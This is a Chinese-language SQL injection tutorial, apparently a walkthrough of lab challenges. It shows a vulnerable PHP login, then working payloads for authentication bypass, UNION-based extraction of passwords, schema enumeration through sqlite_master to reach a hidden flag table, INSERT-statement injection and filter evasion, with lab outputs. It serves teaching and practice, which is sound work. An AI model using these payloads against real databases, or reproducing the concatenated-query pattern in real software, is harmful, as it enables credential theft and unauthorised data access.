# SQL 注入

SQL 注入（SQL Injection）是一种攻击者利用的漏洞技术，旨在篡改发往 SQL 数据库的查询语句。该技术可用于获取或修改数据库内容。当用户提供的输入值被错误地拼接到 SQL 查询中时，便会产生 SQL 注入漏洞。虽然此类漏洞主要出现在 Web 应用程序中，但任何使用 SQL 的应用程序均可能受到影响。

## 示例

假设以下 PHP 代码实现了一个简单的管理员登录功能：

```php
<?php
include 'db.php';

// 从 POST 数据中获取密码
$pass = isset($_POST['pass']) ? $_POST['pass'] : "";

$username = run_query("SELECT username FROM users WHERE username = 'admin' AND password = '$pass';");

if ($username) {
    echo "Welcome $username";
}
?>
```

可以看到，用户提供的 `$pass` 变量被直接拼接到了查询语句中。这种极不安全的做法会使代码面临 SQL 注入攻击的风险。变量替换后，实际执行的查询如下所示：

```sql
SELECT username FROM users WHERE username = 'admin' AND password = 'hunter2';
```

接下来，我们看看尝试注入恶意 SQL 语句时会发生什么。

### 常规请求与恶意注入对比

-   **常规请求**
    正常提交密码进行验证。

-   **注入恶意 SQL**
    当 `$pass` 的值被设置为 `` `admin' OR 'a'='a` `` 时，查询的语义发生了改变，这便是注入攻击。由于末尾添加了额外的 `OR true` 条件，攻击者完全绕过了密码验证。但这并非攻击者在此场景下唯一能做的事情；通过利用 SQL 的 UNION 特性，攻击者还可以从数据库中提取任意数据。

    ```
    admin' OR 'a'='a
    ```
    
    ```sql
    SELECT username FROM users WHERE username = 'admin' AND password = 'admin' OR 'a'='a';
    ```

-   **注入 UNION**
    此时，查询不仅会返回用户名，还会返回管理员的密码。

    ```
    ' UNION SELECT password FROM users WHERE username='admin
    ```

    ```sql
    SELECT username FROM users WHERE username = 'admin' AND password = '' UNION SELECT password FROM users WHERE username='admin';
    ```

### 最基础的 SQL 注入

尝试寻找一种以管理员身份登录的方法。

-   目标

    `is_valid_password = 1`

- code

    ```sql
    -- return
    SELECT 
        (`password` = '§输入§') is_valid_password
    FROM users 
    WHERE username = 'admin' 
    LIMIT 1;
    ```

- 输入
    ```sql
    password = '' OR 'a'='a'
    ```

### 恢复数据

绕过密码检查固然不错，但能够读取任意数据则更为理想。

尝试获取管理员密码。

-   目标

    恢复管理员密码

- code

    ```sql
    -- return
    SELECT 
        username, email
    FROM users 
    WHERE email LIKE '%§输入§%' 
    LIMIT 10;
    ```

输入
- 查询数据库
    ```sql
    LIKE '%' AND 1=0
    UNION SELECT sqlite_version(), NULL
    -- %'
    ```
    - 得到 sqlite 版本 `3.53.4`

- 查询列
    ```sql
    LIKE '%' AND 1=0
    UNION SELECT GROUP_CONCAT(name, ', ') , NULL FROM pragma_table_info('users')
    -- %'
    ```

    - 得到列名
        ```
        username, email, password, role
        ```

- 查询密码
    ```sql
    LIKE '%' AND 1=0
    UNION SELECT GROUP_CONCAT(username || ' ' || password || ' ' || role, ', ') , NULL FROM users
    -- %'
    ```
    - 得到

### 限制查询

该查询本应返回任意密码，但 `limit 0` 阻止了结果的返回。

你能绕过它吗？

-   目标

    恢复管理员密码

- code
    ```sql
    SELECT password FROM users WHERE username = '§输入§' LIMIT 0;
    ```

输入
- 使用注释
    ```sql
    username = '' AND 1=0 UNION SELECT GROUP_CONCAT(username || ' ' || password, ', ') FROM users --
    ```

### 探索内部结构

既然你已经能够恢复任意数据，不妨尝试探索一下数据库。

其中有一个隐藏表包含了一个 flag，你能找到它的位置吗？

-   目标

    从隐藏表中恢复 flag

- code

    ```sql
    SELECT email FROM users WHERE username = '§输入§' LIMIT 1;
    ```

输入
- 在元数据表中查询表名
    ```sql
    username = '' AND 1=0 UNION SELECT GROUP_CONCAT(name, ', ') FROM sqlite_master WHERE type = 'table' --
    ```
    - 得到
        ```
        users, H!dd3n_t4bl3
        ```

- 查询列名
    ```sql
    username = '' AND 1=0 UNION SELECT GROUP_CONCAT(name, ', ') FROM pragma_table_info('H!dd3n_t4bl3') --
    ```
    - 得到 
        ```
        flag
        ```

- 查询数据
    ```sql
    username = '' AND 1=0 UNION SELECT flag FROM 'H!dd3n_t4bl3' --
    ```
    - 注意，特殊字符作为表名时使用引号包裹
    - 得到 
        ```
        flag
        ```
    
### 插入 Payload

有时，注入可能发生在 `INSERT` 语句中。

-   目标

    恢复管理员密码。

- code
    ```sql
    -- run
    INSERT INTO maillinglist(email, enabled) VALUES ('§输入§', TRUE);

    SELECT 
    email, enabled
    FROM maillinglist 
    ORDER BY `rowid` DESC 
    LIMIT 5;
    ```

输入
- 查询创建表语句
    ```sql
    VALUES ('' || (SELECT GROUP_CONCAT(sql, ', ') FROM sqlite_master) || '', TRUE);
    ```
    - 得到
        ```
        CREATE TABLE maillinglist (\n  email text,\n  enabled boolean\n), CREATE TABLE users (\n  username text,\n  password text\n)
        ```

- 查询数据
    ```sql
    VALUES ('' || (SELECT GROUP_CONCAT(username || ' ' || password, ', ') FROM users) || '', TRUE);
    ```
    - 得到
        ```
        admin FLAG{y06azxph2hi2574ez5937vj}
        ```

### 过滤 SQL 注入

在此挑战中，你的输入在被注入查询之前会经过大量转换。

虽然这使得利用变得更加困难，但这不应成为你的阻碍。

-   目标

    恢复管理员密码

- code
    ```sql
    SELECT 
    `username`, `email`
    FROM `users`
    WHERE `email` = '§输入§@company.name'
    LIMIT 5;
    ```
    - 限制
        - 第一个空格被替换为 `.`
            - 空格放入前缀字符串
        - 第一个 `password` 被移除
            - 设置一个冗余 `password` 字符串

输入
- 构造载荷
    ```sql
    email = ' ' AND 1=0 
    UNION SELECT GROUP_CONCAT(username || ' ' || passwordpassword, ', '), NULL FROM users --
    ```
